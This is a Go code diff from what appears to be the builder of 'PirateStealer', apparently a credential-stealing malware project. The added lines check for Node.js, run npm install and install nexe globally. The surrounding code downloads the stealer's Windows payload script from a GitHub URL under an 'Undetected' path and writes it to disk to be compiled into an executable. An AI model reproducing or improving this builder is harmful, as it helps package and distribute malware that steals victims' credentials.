@@ -133,13 +133,42 @@ func replace(s, old, new string) string {
 }
 
 func buildPlatform() {
+	rand.Seed(time.Now().Unix())
 	for _, platform := range cfg.Platform {
 		switch platform {
 		case "windows":
 
+			logger.Info("Starting to compile")
+			// Check for node
+			_, err := exec.Command("node", "-v").Output()
+			if err != nil {
+				logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
+				time.Sleep(5 * time.Second)
+				os.Exit(1)
+			}
+			logger.Info("Installing deps")
+
+			// Install dependencies
+			_, err = exec.Command("npm", "install").Output()
+			if err != nil {
+				logger.Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
+				time.Sleep(5 * time.Second)
+				os.Exit(1)
+			}
+			// Check pkg
+			_, err = exec.Command("nexe", "-v").Output()
+			if err != nil {
+				logger.Info("Installing nexe")
+				_, err = exec.Command("npm", "install", "-g", "nexe").Output()
+				if err != nil {
+					logger.Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
+			}
 			logger.Info("Building Windows")
 			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index-win.js")
-			err := ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
+			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
 				logger.Fatal("Error writing to file", err)
 			}
